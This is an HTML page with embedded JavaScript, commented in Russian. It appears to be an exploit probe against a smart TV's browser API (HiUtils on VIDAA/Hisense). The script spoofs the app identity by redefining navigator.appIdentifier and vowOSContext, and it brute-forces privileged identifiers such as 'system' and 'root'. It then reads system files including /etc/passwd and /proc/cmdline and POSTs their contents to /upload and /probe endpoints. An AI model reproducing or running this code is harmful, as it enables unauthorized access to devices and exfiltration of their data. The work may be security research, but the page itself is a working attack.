<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>tv identifier v2</title>
<style>
 body{font:16px/1.3 sans-serif;background:#111;color:#eee;margin:0;padding:16px}
 h1{font-size:18px;margin:0 0 8px}
 #log{white-space:pre-wrap;font-family:monospace;font-size:12px}
 .ok{color:#6f6}.bad{color:#f66}.dim{color:#888}.hit{color:#ff0}
</style>
</head>
<body>
<h1>identifier, попытка 2 <small class="dim">read-only</small></h1>
<div id="log"></div>
<script>
/* Почему p7 не сработала: getIdentifier проверяет
     window.navigator.appIdentifier !== 'undefined'
   а у нас там ровно строка "undefined" — условие ложно, vowOSContext не читается.
   Значит надо переопределить ещё и navigator.appIdentifier. */
var API = "", out = { env: {}, tries: [], files: [] };
var FILES = ["/etc/version", "/etc/passwd", "/etc/group", "/etc/hosts", "/proc/version",
             "/proc/cmdline", "/proc/mounts", "/etc/inittab", "/etc/os-release"];

function log(m, c) {
  var el = document.getElementById("log"), d = document.createElement("div");
  if (c) d.className = c; d.textContent = String(m).slice(0, 380); el.appendChild(d);
}
function post(p, o, cb) {
  try { var x = new XMLHttpRequest(); x.open("POST", API + p, true);
    x.setRequestHeader("Content-Type", "application/json");
    x.onreadystatechange = function () { if (x.readyState === 4 && cb) cb(x.status); };
    x.send(JSON.stringify(o)); } catch (e) { if (cb) cb(0); }
}
function call(api, args) {
  try { return window.HiUtils_createRequest(api, args); }
  catch (e) { return { thrown: String(e && e.message || e) }; }
}
function js(r) { try { return JSON.stringify(r).slice(0, 320); } catch (e) { return String(r).slice(0, 200); } }

/* сначала проверяем, переопределяется ли свойство вообще */
function setNav(v) {
  var ok = [];
  try { Object.defineProperty(navigator, "appIdentifier", { value: v, configurable: true, writable: true }); ok.push("instance"); } catch (e) { ok.push("inst-err:" + e.message); }
  if (String(navigator.appIdentifier) !== String(v)) {
    try { var p = Object.getPrototypeOf(navigator); Object.defineProperty(p, "appIdentifier", { get: function () { return v; }, configurable: true }); ok.push("proto"); } catch (e) { ok.push("proto-err:" + e.message); }
  }
  if (String(navigator.appIdentifier) !== String(v)) {
    try { navigator.appIdentifier = v; ok.push("assign"); } catch (e) { ok.push("assign-err:" + e.message); }
  }
  return { how: ok, now: String(navigator.appIdentifier) };
}
function setIdent(v) {
  window.vowOSContext = { getAppIdentifier: function () { return v; } };
  return setNav(v);
}

out.env.before = { navAppId: String(navigator.appIdentifier), ident: (function () { try { return window.vowOS.service.getIdentifier(); } catch (e) { return "err"; } })() };
var probeSet = setIdent("ZQTEST");
out.env.setterProbe = probeSet;
out.env.identAfterProbe = (function () { try { return window.vowOS.service.getIdentifier(); } catch (e) { return "err:" + e; } })();
log("навигатор: " + out.env.before.navAppId + " -> " + probeSet.now + " (" + probeSet.how.join(",") + ")", "dim");
log("getIdentifier после подмены: '" + out.env.identAfterProbe + "'", out.env.identAfterProbe === "ZQTEST" ? "hit" : "bad");

if (out.env.identAfterProbe !== "ZQTEST") {
  log("свойство не переопределяется — ищем другой путь", "bad");
  finish();
} else {
  var CANDS = ["tv.vidaa.app.browser", "com.hisense.browser", "tv.vidaa.res.iot", "system",
               "root", "vidaa", "hisense", "tv.vidaa.app.settings", "browser", ""];
  var i = 0;
  (function next() {
    if (i >= CANDS.length) return afterCands();
    var id = CANDS[i++];
    setIdent(id);
    var dev = call("deviceCode");
    var fr = call("fileRead", { path: "/etc/version" });
    var sDev = js(dev), sFr = js(fr), path = "";
    try { path = fr.msg.path || ""; } catch (e) {}
    var devOk = sDev.indexOf("503") < 0 && sDev.indexOf("permission") < 0;
    var undef = path.indexOf("undefined") >= 0;
    out.tries.push({ id: id, getIdent: window.vowOS.service.getIdentifier(), deviceCode: sDev, fileRead: sFr, devOk: devOk, stillUndefined: undef });
    log(((devOk || !undef) ? "HIT  " : "     ") + (id || "<empty>") + " | ident=" + window.vowOS.service.getIdentifier() +
        " | dev:" + (devOk ? "PASS" : "503") + " | " + (path || sFr.slice(0, 70)), (devOk || !undef) ? "hit" : "dim");
    setTimeout(next, 70);
  })();
}

function afterCands() {
  var win = out.tries.filter(function (t) { return t.devOk || !t.stillUndefined; })[0];
  if (!win) { log("подмена идентичности принята, но поведение не изменилось", "bad"); return finish(); }
  log("работает с ident=" + (win.id || "<empty>") + " — читаю файлы", "ok");
  setIdent(win.id);
  var j = 0;
  (function one() {
    if (j >= FILES.length) return finish();
    var p = FILES[j++], r = call("fileRead", { path: p }), ok = !!(r && r.ret);
    out.files.push({ path: p, ret: ok, result: ok ? r.msg : js(r) });
    log((ok ? "ok   " : "err  ") + p, ok ? "ok" : "bad");
    post("/upload", { path: p, type: "file", strategy: "hiutils/fileRead",
      status: ok ? "ok" : "error",
      data: ok ? (typeof r.msg === "string" ? r.msg : JSON.stringify(r.msg)) : null,
      error: ok ? null : js(r) }, function () { setTimeout(one, 100); });
  })();
}

function finish() {
  out.userAgent = navigator.userAgent;
  post("/probe", Object.assign({ name: "identfor2" }, out), function (st) {
    log(st === 200 ? "готово: отправлено" : "ошибка отправки " + st, st === 200 ? "ok" : "bad");
  });
}
</script>
</body>
</html>
